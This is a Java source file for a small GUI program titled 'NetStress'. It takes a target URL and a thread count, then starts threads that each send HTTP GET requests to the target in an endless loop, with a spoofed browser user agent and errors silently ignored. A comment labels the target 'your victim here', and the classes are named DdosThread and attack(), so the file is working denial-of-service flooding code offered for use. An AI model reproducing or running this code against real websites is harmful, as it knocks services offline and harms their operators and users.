import java.awt.*;
import java.awt.event.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main extends Frame{

    Label target = new Label("Target URL: ",Label.LEFT);
    Label threads = new Label("Threads: ",Label.LEFT);
    TextField url = new TextField("URL");
    TextField threadC = new TextField("Thread Count");
    Button submit = new Button("Submit");
    static String r;
    static int j;

    public Main () {
        setLayout(new FlowLayout());
        add(target);
        add(url);
        add(threads);
        add(threadC);
        add(submit);
        BtnPress listener = new BtnPress();
        submit.addActionListener(listener);
        setTitle("NetStress");
        setSize(350, 100);
        setVisible(true);
    }

    private class BtnPress implements ActionListener {
        @Override
        public void actionPerformed(ActionEvent evt) {
            url.setEditable(false);
            threadC.setEditable(false);
            r = url.getText();
            j = Integer.parseInt(threadC.getText());
            for (int i = 0; i < j; i++) {
                DdosThread thread;
                try {
                    thread = new DdosThread(r);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
                thread.start();
            }
        }
    }

    public static void main(String[] args) {
        Main app = new Main();
    }

    public static class DdosThread extends Thread {

        private final AtomicBoolean running = new AtomicBoolean(true);
        private final String request; //your victim here
        private final URL url;

        String param;

        public DdosThread(String r) throws Exception {
            request = r;
            url = new URI(r).toURL();
            param = "param1=" + URLEncoder.encode("87845", StandardCharsets.UTF_8);
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception ignored) {}

            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url
                    .openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", this.request);
            connection
                    .setRequestProperty("User-Agent",
                            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        }
    }

}